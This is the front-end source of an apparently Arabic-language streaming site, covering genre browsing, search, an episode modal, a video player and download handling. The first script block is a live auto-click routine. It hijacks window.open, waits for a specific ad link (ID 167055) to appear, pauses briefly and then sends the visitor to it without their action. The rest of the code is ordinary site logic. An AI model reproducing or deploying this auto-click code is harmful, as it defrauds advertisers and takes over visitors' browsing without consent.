  <!-- ============================================================
       كود النقر التلقائي الجديد
       - يمنع النوافذ المنبثقة تماماً
       - يفتح الإعلان في الصفحة الرئيسية فقط
       - ينتظر ظهور الرابط + مدة مشاهدة قصيرة ثم ينقر
       ============================================================ -->
  <script>
  (function() {
    // 1) منع النوافذ المنبثقة نهائياً
    var _origOpen = window.open;
    window.open = function(url, name, features) {
      if (url && typeof url === 'string' && url.length > 0) {
        try { window.location.href = url; } catch(e) {}
      }
      return null;
    };

    var targetId = "167055";
    var VIEW_DELAY = 2500;      // مدة مشاهدة الإعلان قبل النقر (ms)
    var POLL_INTERVAL = 150;    // سرعة المراقبة (ms)
    var MAX_WAIT = 10000;       // أقصى مدة انتظار لظهور الرابط (ms)

    var executed = false;

    function findTargetLink() {
      // أ) href يحتوي على targetId
      var anchors = document.querySelectorAll('a[href]');
      for (var i = 0; i < anchors.length; i++) {
        var href = anchors[i].getAttribute('href');
        if (href && href.indexOf(targetId) !== -1) return anchors[i];
      }
      // ب) عنصر له id = targetId ثم أقرب رابط أبوي
      var elemById = document.getElementById(targetId);
      if (elemById) {
        var parentLink = elemById.closest ? elemById.closest('a') : null;
        if (parentLink) return parentLink;
      }
      // ج) a[data-id="targetId"]
      for (var j = 0; j < anchors.length; j++) {
        var dataId = anchors[j].getAttribute('data-id');
        if (dataId && dataId === targetId) return anchors[j];
      }
      return null;
    }

    function clickSamePage(anchor) {
      if (executed || !anchor) return false;
      executed = true;
      var href = anchor.getAttribute('href');
      if (!href || href === '#' || href.indexOf('javascript:') === 0) {
        executed = false;
        return false;
      }
      anchor.removeAttribute('target');
      anchor.setAttribute('target', '_self');
      anchor.setAttribute('rel', 'noopener');
      anchor.onclick = null;
      try {
        window.location.href = href;
      } catch (e) {
        anchor.click();
      }
      return true;
    }

    function startWatcher() {
      var startTime = Date.now();
      var timer = setInterval(function() {
        var link = findTargetLink();
        if (link) {
          clearInterval(timer);
          // انتظر قليلاً ليشاهد الزائر الإعلان ثم انقر
          setTimeout(function() { clickSamePage(link); }, VIEW_DELAY);
        } else if (Date.now() - startTime > MAX_WAIT) {
          clearInterval(timer);
          console.log("لم يتم العثور على الرابط:", targetId);
        }
      }, POLL_INTERVAL);
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', startWatcher);
    } else {
      startWatcher();
    }
  })();
  </script>

      document.querySelector('.choice-copy span').textContent = dict.chooseAction;

      const featuredMoreLabel = document.getElementById('featuredMoreLabel');
      if(featuredMoreLabel) featuredMoreLabel.textContent = dict.featuredMore;
      updateFeaturedMoreButton();

      const gridTitleEl = document.getElementById('gridTitle');
      if(gridTitleEl && !gridTitleEl.dataset.dynamic) gridTitleEl.textContent = dict.results;

      updateFeaturedTitle();
    }

    let activeType = 'series';
    let currentGenreUrl = '';
    let currentPage = 1;
    let isSearching = false;
    let currentView = 'homeView';
    let globalEpisodes = [];
    let currentEpisodeNum = -1;
    let playerInstance = null;
    let hlsInstance = null;
    let currentDownloadUrl = '';
    let currentPoster = '';
    let currentMediaTitle = '';
    let chosenEpisode = null;

    function renderCategories(){
      const data = CATEGORY_DATA[activeType];
      const grid = document.getElementById('categoryGrid');
      const dict = TRANSLATIONS[currentLang];
      grid.innerHTML = '';
      data.forEach(item => {
        const label = dict.categories[item.key];
        const card = document.createElement('button');
        card.type = 'button';
        card.className = 'category-card';
        const iconHtml = `<i class="fa-solid ${item.icon}"></i>`;
        card.innerHTML = `<span class="cat-icon">${iconHtml}</span><span class="cat-copy"><strong>${label}</strong></span>`;
        const typeLabel = activeType === 'series' ? dict.tabSeries : dict.tabMovies;
        card.onclick = () => loadGenre(item.url, `${typeLabel} ${label}`);
        grid.appendChild(card);
      });
    }

    function updateFeaturedTitle(){
      const el=document.getElementById('featuredTitle');
      if(el) el.innerHTML=`<i class="fa-solid fa-star" style="color:#ffd166"></i> ${activeType === 'series' ? t('featuredSeries') : t('featuredMovies')}`;
    }

    let featuredPage = 1;
    let featuredLoading = false;
    let featuredHasMore = false;

    function updateFeaturedMoreButton(){
      const btn=document.getElementById('featuredMoreBtn');
      const label=document.getElementById('featuredMoreLabel');
      if(!btn || !label) return;
      label.textContent = featuredLoading ? t('featuredLoadingMore') : t('featuredMore');
      btn.disabled = featuredLoading;
      btn.style.display = featuredHasMore ? 'inline-flex' : 'none';
    }

    function appendFeaturedCards(items){
      const grid=document.getElementById('featuredGrid');
      const dict=TRANSLATIONS[currentLang];
      items.forEach(item=>{
        const card=document.createElement('article');
        card.className='featured-card';
        const badge=item.is_series ? dict.badgeSeries : dict.badgeMovie;
        card.innerHTML=`<div class="featured-poster"><img src="${escapeAttr(item.img||'')}" alt="${escapeAttr(item.title||'')}" loading="lazy" referrerpolicy="no-referrer"><span class="featured-star"><i class="fa-solid fa-star"></i></span><span class="featured-badge">${badge}</span></div><div class="featured-title">${escapeHtml(item.title||dict.untitled)}</div>`;
        card.onclick=()=>getDetails(item.href,item.is_series,item.img||'',item.title||'');
        grid.appendChild(card);
      });
    }

    async function loadFeatured(reset=true){
      const grid=document.getElementById('featuredGrid');
      if(!grid || featuredLoading) return;
      const dict=TRANSLATIONS[currentLang];
      if(reset){
        featuredPage=1;
        featuredHasMore=false;
        grid.innerHTML=`<div class="featured-empty">${dict.loading}</div>`;
      }
      featuredLoading=true;
      updateFeaturedMoreButton();
      const cfg=FEATURED_DATA[activeType];
      const data=await fetchAPI(`?action=genre&genre=${encodeURIComponent(cfg.url)}&p=${featuredPage}`);
      const items=data && data.status==='success' && Array.isArray(data.data) ? data.data : [];
      if(reset) grid.innerHTML='';
      if(!items.length && reset){
        grid.innerHTML=`<div class="featured-empty">${dict.noResults}</div>`;
        featuredHasMore=false;
      }else if(items.length){
        appendFeaturedCards(items);
        // نفترض وجود المزيد إذا أعاد الخادم صفحة ممتلئة بـ15 عنصرًا.
        featuredHasMore = items.length >= cfg.limit;
      }else{
        featuredHasMore=false;
      }
      featuredLoading=false;
      updateFeaturedMoreButton();
    }

    async function loadMoreFeatured(){
      if(featuredLoading || !featuredHasMore) return;
      featuredPage += 1;
      await loadFeatured(false);
    }

    function switchType(type){
      activeType = type;
      document.getElementById('seriesTab').classList.toggle('active', type === 'series');
      document.getElementById('moviesTab').classList.toggle('active', type === 'movies');
      if(currentView !== 'homeView') showView('homeView', false);
      renderCategories();
      updateFeaturedTitle();
      loadFeatured();
      window.scrollTo({top:0,behavior:'smooth'});
    }

    function showView(viewId, push = true){
      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
      document.getElementById(viewId).classList.add('active');
      currentView = viewId;
      document.getElementById('searchArea').style.display = viewId === 'homeView' ? 'block' : 'none';
      if(push && history.state?.view !== viewId) history.pushState({view:viewId}, '', location.href);
      window.scrollTo({top:0,behavior:'smooth'});
    }

    function goBack(){
      if(history.state && history.state.view !== 'homeView') history.back();
      else showView('homeView', false);
    }

    function goHome(){
      if(currentView !== 'homeView') showView('homeView');
    }

    window.addEventListener('popstate', () => {
      destroyPlayer();
      if(currentView === 'detailsView' && document.getElementById('mediaGrid').children.length){
        showView('gridView', false);
      }else{
        showView('homeView', false);
      }
    });

    function destroyPlayer(){
      exitCinemaFullscreen();
      try{ if(playerInstance){playerInstance.destroy();playerInstance=null;} }catch(e){}
      try{ if(hlsInstance){hlsInstance.destroy();hlsInstance=null;} }catch(e){}
      document.getElementById('videoContainer').innerHTML='';
    }

    function toggleLoader(show){ document.getElementById('loader').style.display = show ? 'flex' : 'none'; }

    function showToast(message){
      const el = document.getElementById('toast');
      el.textContent = message;
      el.classList.add('show');
      clearTimeout(showToast.t);
      showToast.t = setTimeout(()=>el.classList.remove('show'),2200);
    }

    async function fetchAPI(endpoint){
      toggleLoader(true);
      try{
        const response = await fetch(API_URL + endpoint, {cache:'no-store'});
        if(!response.ok) throw new Error('HTTP '+response.status);
        const data = await response.json();
        return data;
      }catch(error){
        showToast(t('connectionError'));
        return null;
      }finally{
        toggleLoader(false);
      }
    }

    async function loadGenre(url, title, page = 1){
      if(page === 1){
        currentGenreUrl = url;
        currentPage = 1;
        isSearching = false;
        document.getElementById('mediaGrid').innerHTML='';
        const gt=document.getElementById('gridTitle');
        gt.textContent=title;
        gt.dataset.dynamic='1';
        document.getElementById('loadMoreBtn').style.display='none';
        showView('gridView');
      }
      const data = await fetchAPI(`?action=genre&genre=${encodeURIComponent(url)}&p=${page}`);
      if(data && data.status === 'success'){
        renderCards(Array.isArray(data.data) ? data.data : []);
        document.getElementById('loadMoreBtn').style.display = data.data && data.data.length ? 'block' : 'none';
      }
    }

    async function executeSearch(){
      const query = document.getElementById('searchInput').value.trim();
      if(!query) return;
      isSearching = true;
      document.getElementById('mediaGrid').innerHTML='';
      const gt=document.getElementById('gridTitle');
      gt.textContent=`${t('searchResults')}${query}`;
      gt.dataset.dynamic='1';
      document.getElementById('loadMoreBtn').style.display='none';
      showView('gridView');
      const data = await fetchAPI(`?action=search&q=${encodeURIComponent(query)}`);
      if(data && data.status === 'success') renderCards(Array.isArray(data.data) ? data.data : []);
    }

    // البحث التلقائي أثناء الكتابة بدون الحاجة إلى الضغط على Enter
    let searchTimer = null;
    let lastSearchQuery = '';
    const searchInput = document.getElementById('searchInput');

    searchInput.addEventListener('input', () => {
      const query = searchInput.value.trim();
      clearTimeout(searchTimer);

      if(!query){
        lastSearchQuery = '';
        goHome();
        return;
      }

      // مهلة قصيرة تمنع إرسال طلب API مع كل ضغطة بسرعة شديدة
      searchTimer = setTimeout(() => {
        if(query !== lastSearchQuery){
          lastSearchQuery = query;
          executeSearch();
        }
      }, 250);
    });

    searchInput.addEventListener('keydown', e => {
      if(e.key === 'Enter'){
        e.preventDefault();
        clearTimeout(searchTimer);
        lastSearchQuery = searchInput.value.trim();
        executeSearch();
      }
    });

    function loadMore(){
      if(isSearching) return;
      currentPage += 1;
      loadGenre(currentGenreUrl, document.getElementById('gridTitle').textContent, currentPage);
    }

    function renderCards(items){
      const grid = document.getElementById('mediaGrid');
      if(!items.length && !grid.children.length){
        grid.innerHTML=`<div class="empty"><i class="fa-regular fa-face-frown"></i><br><br>${t('noResults')}</div>`;
        return;
      }
      items.forEach(item => {
        const card = document.createElement('article');
        card.className='media-item';
        const badge = item.is_series ? t('badgeSeries') : t('badgeMovie');
        card.innerHTML=`<div class="poster-wrap"><img src="${escapeAttr(item.img || '')}" alt="${escapeAttr(item.title || '')}" loading="lazy" referrerpolicy="no-referrer"><span class="media-badge">${badge}</span></div><div class="media-title">${escapeHtml(item.title || t('untitled'))}</div>`;
        card.onclick = () => getDetails(item.href, item.is_series, item.img || '', item.title || '');
        grid.appendChild(card);
      });
    }

    async function getDetails(url, isSeriesKnown = true, poster = '', knownTitle = ''){
      showView('detailsView');
      document.getElementById('mediaTitle').textContent=t('loadingDetails');
      document.getElementById('playerSection').style.display='none';
      document.getElementById('episodesSection').style.display='none';
      destroyPlayer();
      globalEpisodes=[];
      currentEpisodeNum=-1;
      if(poster) currentPoster = poster;
      if(knownTitle) currentMediaTitle = knownTitle;

      const data = await fetchAPI(`?action=series&series=${encodeURIComponent(url)}`);
      if(!data || data.status !== 'success'){
        document.getElementById('mediaTitle').textContent=t('failDetails');
        return;
      }

      currentMediaTitle = data.movie_title || currentMediaTitle || t('details');
      document.getElementById('mediaTitle').textContent=currentMediaTitle;
      if(Array.isArray(data.episodes) && data.episodes.length){
        globalEpisodes=data.episodes;
        document.getElementById('episodesSection').style.display='block';
        document.getElementById('episodesCount').textContent=t('episodesCount')(data.episodes.length);
        renderEpisodes(url, data.movie_title || '');
      }

      if(data.media_src || data.is_iframe){
        setupPlayer(data);
      }else if(!globalEpisodes.length){
        document.getElementById('playerSection').style.display='block';
        document.getElementById('videoContainer').innerHTML=`<div style="aspect-ratio:16/9;display:grid;place-items:center;color:#94a3b8;padding:20px;text-align:center">${t('linkUnavailable')}</div>`;
      }
    }

    function renderEpisodes(currentUrl, title){
      const list=document.getElementById('episodesList');
      list.innerHTML='';
      const epMatch=title.match(/الحلقة\s*(\d+)/);
      if(epMatch) currentEpisodeNum=parseInt(epMatch[1],10);

      globalEpisodes.forEach(ep => {
        const btn=document.createElement('button');
        btn.type='button';
        btn.className='episode';
        const poster = currentPoster || '';
        btn.innerHTML=`<img class="episode-poster" src="${escapeAttr(poster)}" alt="${escapeAttr(currentMediaTitle)}" loading="lazy" referrerpolicy="no-referrer"><span class="episode-info"><span class="episode-name">${t('episodeLabel')} ${escapeHtml(ep.num)}</span><span class="episode-play"><i class="fa-solid fa-play"></i></span></span>`;
        if(currentEpisodeNum === ep.num || (currentUrl && ep.link && currentUrl.includes(ep.link))){
          btn.classList.add('active');
          currentEpisodeNum=ep.num;
        }
        btn.onclick=()=>prepareEpisodeChoice(ep);
        list.appendChild(btn);
      });
    }

    async function prepareEpisodeChoice(ep){
      chosenEpisode={...ep, data:null};
      document.getElementById('choicePoster').src=currentPoster || '';
      document.getElementById('choiceTitle').textContent=`${currentMediaTitle || t('seriesFallback')} - ${t('episodeLabel')} ${ep.num}`;
      const modal=document.getElementById('episodeModal');
      modal.classList.add('show');
      document.getElementById('choiceDownloadBtn').style.display='none';
      const data=await fetchAPI(`?action=series&series=${encodeURIComponent(ep.link)}`);
      if(!chosenEpisode || chosenEpisode.link!==ep.link) return;
      chosenEpisode.data=data && data.status==='success' ? data : null;
      document.getElementById('choiceDownloadBtn').style.display=chosenEpisode.data?.media_src ? 'flex' : 'none';
    }

    function closeEpisodeModal(){
      document.getElementById('episodeModal').classList.remove('show');
    }

    function watchChosenEpisode(){
      if(!chosenEpisode?.data){ showToast(t('episodePreparing')); return; }
      const ep=chosenEpisode;
      closeEpisodeModal();
      currentEpisodeNum=Number(ep.num);
      currentDownloadUrl=ep.data.media_src || '';
      document.getElementById('mediaTitle').textContent=`${currentMediaTitle} - ${t('episodeLabel')} ${ep.num}`;
      document.getElementById('playerSection').style.display='block';
      setupPlayer(ep.data, true);
      window.scrollTo({top:0,behavior:'smooth'});
    }

    function downloadChosenEpisode(){
      if(!chosenEpisode?.data?.media_src){ showToast(t('episodeNoDownload')); return; }
      currentDownloadUrl=chosenEpisode.data.media_src;
      startDownload();
    }

    function setupPlayer(data, autoFullscreen = false){
      const section=document.getElementById('playerSection');
      const container=document.getElementById('videoContainer');
      section.style.display='block';
      destroyPlayer();
      if(autoFullscreen) enterCinemaFullscreen();

      if(data.is_iframe){
        container.innerHTML=`<iframe src="${escapeAttr(data.media_src)}" allow="autoplay; fullscreen; picture-in-picture" allowfullscreen></iframe>`;
      }else{
        container.innerHTML='<video id="plyrPlayer" playsinline controls></video>';
        const video=document.getElementById('plyrPlayer');
        const options={
          controls:['play-large','restart','rewind','play','fast-forward','progress','current-time','duration','mute','volume','captions','settings','pip','airplay','fullscreen'],
          settings:['quality','speed'],
          seekTime:10,
          autoplay:true,
          fullscreen:{enabled:true,fallback:true,iosNative:true}
        };
        if(String(data.media_src).includes('.m3u8') && window.Hls && Hls.isSupported()){
          hlsInstance=new Hls({enableWorker:true});
          hlsInstance.loadSource(data.media_src);
          hlsInstance.attachMedia(video);
          hlsInstance.on(Hls.Events.MANIFEST_PARSED,()=>{
            playerInstance=new Plyr(video,options);
            playerInstance.play().catch(()=>{});
            if(autoFullscreen) setTimeout(()=>enterCinemaFullscreen(),80);
          });
        }else{
          video.src=data.media_src;
          playerInstance=new Plyr(video,options);
          playerInstance.play().catch(()=>{});
          if(autoFullscreen) setTimeout(()=>enterCinemaFullscreen(),80);
        }
      }

      currentDownloadUrl = data.media_src || '';
      const dlBtn=document.getElementById('dlBtn');
      dlBtn.style.display=currentDownloadUrl ? 'flex' : 'none';
      dlBtn.onclick=startDownload;

      const nextBtn=document.getElementById('nextBtn');
      const prevBtn=document.getElementById('prevBtn');
      nextBtn.style.display='none';
      prevBtn.style.display='none';
      if(currentEpisodeNum !== -1 && globalEpisodes.length){
        const idx=globalEpisodes.findIndex(e=>Number(e.num)===Number(currentEpisodeNum));
        if(idx>0){
          prevBtn.style.display='flex';
          prevBtn.onclick=()=>getDetails(globalEpisodes[idx-1].link,true,currentPoster,currentMediaTitle);
        }
        if(idx!==-1 && idx<globalEpisodes.length-1){
          nextBtn.style.display='flex';
          nextBtn.onclick=()=>getDetails(globalEpisodes[idx+1].link,true,currentPoster,currentMediaTitle);
        }
      }
    }

    function enterCinemaFullscreen(){
      const section=document.getElementById('playerSection');
      section.classList.add('cinema-shell');
      document.body.classList.add('cinema-mode');
      try{
        if(window.Android && typeof window.Android.enterFullscreen === 'function') window.Android.enterFullscreen();
      }catch(e){}
      try{
        const req=section.requestFullscreen || section.webkitRequestFullscreen || section.msRequestFullscreen;
        if(req) Promise.resolve(req.call(section)).catch(()=>{});
      }catch(e){}
      try{ if(screen.orientation?.lock) screen.orientation.lock('landscape').catch(()=>{}); }catch(e){}
    }

    function exitCinemaFullscreen(){
      document.getElementById('playerSection').classList.remove('cinema-shell');
      document.body.classList.remove('cinema-mode');
      try{ if(screen.orientation?.unlock) screen.orientation.unlock(); }catch(e){}
      try{
        if(window.Android && typeof window.Android.exitFullscreen === 'function') window.Android.exitFullscreen();
      }catch(e){}
    }

    document.addEventListener('fullscreenchange',()=>{ if(!document.fullscreenElement) exitCinemaFullscreen(); });
    document.addEventListener('webkitfullscreenchange',()=>{ if(!document.webkitFullscreenElement) exitCinemaFullscreen(); });

    function startDownload(){
      if(!currentDownloadUrl) return;
      /* دعم اختياري إذا كان التطبيق يوفّر JavaScriptInterface باسم Android */
      try{
        if(window.Android && typeof window.Android.downloadFile === 'function'){
          window.Android.downloadFile(currentDownloadUrl);
          return;
        }
      }catch(e){}

      const a=document.createElement('a');
      a.href=currentDownloadUrl;
      a.setAttribute('download','');
      a.rel='noopener';
      a.target='_self';
      document.body.appendChild(a);
      a.click();
      a.remove();
    }

    function escapeHtml(value){
      return String(value).replace(/[&<>'"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]));
    }
    function escapeAttr(value){ return escapeHtml(value); }

    document.addEventListener('keydown',e=>{ if(e.key==='Escape' && document.getElementById('episodeModal').classList.contains('show')) closeEpisodeModal(); });

    /* ====== جعل بانر Adsterra (728x90) متجاوباً مع شاشات الجوال ====== */
    
    function fitAdSlot(slotId, adWidth, adHeight){
      const slot = document.getElementById(slotId);
      if(!slot) return;
      const wrap = slot.querySelector('.ad-scale-wrap');
      if(!wrap) return;
      function resize(){
        const containerWidth = slot.clientWidth || adWidth;
        const scale = Math.min(1, containerWidth / adWidth);
        wrap.style.transform = `scale(${scale})`;
        slot.style.height = Math.ceil(adHeight * scale) + 'px';
      }
      resize();
      window.addEventListener('resize', resize);
    }
    window.addEventListener('load', () => { fitAdSlot('adSlotTop', 728, 90); fitAdSlot('adSlotBottom', 300, 250); });

    history.replaceState({view:'homeView'},'',location.href);
    applyLang();
    renderCategories();
    loadFeatured();
  </script>
